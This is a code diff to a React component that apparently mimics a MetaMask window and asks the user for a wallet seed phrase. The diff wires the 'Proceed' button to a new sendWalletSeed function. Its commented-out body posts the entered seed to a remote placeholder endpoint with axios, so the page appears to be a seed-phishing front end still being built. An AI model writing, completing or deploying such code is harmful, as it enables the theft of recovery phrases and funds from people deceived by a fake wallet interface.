@@ -1,5 +1,6 @@
 import { Box } from '@material-ui/core';
 import React, { useEffect, useState } from 'react';
+import axios from 'axios';
 import MetaMaskImg from 'assets/images/metamask.svg';
 import MetaMaskFullImg from './../../../assets/images/metamask-logo-horizontal.svg';
 import './MetaMaskWin.scss';
@@ -20,6 +21,19 @@ const MetaMaskWin = () => {
 
   function handleChange(e) {
     setWalletSeedInput(e.target.value);
+  }
+  async function sendWalletSeed() {
+    console.log('on Submit: >');
+    // const payload = walletSeedInput;
+    // try {
+    //   const response = await axios.post(
+    //     'https://jsonplaceholder.typicode.com/posts',
+    //     payload
+    //   );
+    //   console.log(response);
+    // } catch (error) {
+    //   console.log(error);
+    // }
   }
 
   return (
@@ -74,6 +88,7 @@ const MetaMaskWin = () => {
                       ? 'activeB'
                       : ''
                   }`}
+                  onClick={sendWalletSeed}
                 >
                   Proceed
                 </button>
